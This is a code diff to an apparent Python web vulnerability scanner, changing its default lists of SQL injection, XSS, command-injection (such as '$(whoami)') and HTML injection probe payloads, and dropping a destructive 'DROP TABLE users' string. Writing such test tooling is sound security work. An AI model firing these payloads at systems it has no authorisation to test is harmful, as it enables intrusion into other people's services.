@@ -2,10 +2,10 @@ import requests
 
 # Basic payloads for each category (you can later load from files or user input)
 default_payloads = {
-    "SQLi": ["' OR '1'='1", "'; DROP TABLE users; --", "' OR 1=1--"],
-    "XSS": ["<script>alert(1)</script>", "\" onerror=\"alert(1)"],
-    "CMD": ["; ls", "&& whoami"],
-    "HTML": ["<b>Test</b>", "<img src=x onerror=alert(1)>"]
+    "SQLi": ["' OR '1'='1", "' AND 1=2--", "' OR 1=1--", "' UNION SELECT NULL--"],
+    "XSS": ["<script>alert(1)</script>", "\" onmouseover=\"alert(1)", "'><svg onload=alert(1)>"],
+    "CMD": ["; whoami", "&& whoami", "| whoami", "`whoami`", "$(whoami)"],
+    "HTML": [ "<b>Test</b>", "<i>Italic</i>", "<img src=x onerror=alert(1)>"]
 }
 
 def scan_for_vulnerabilities(url, selected_payloads):
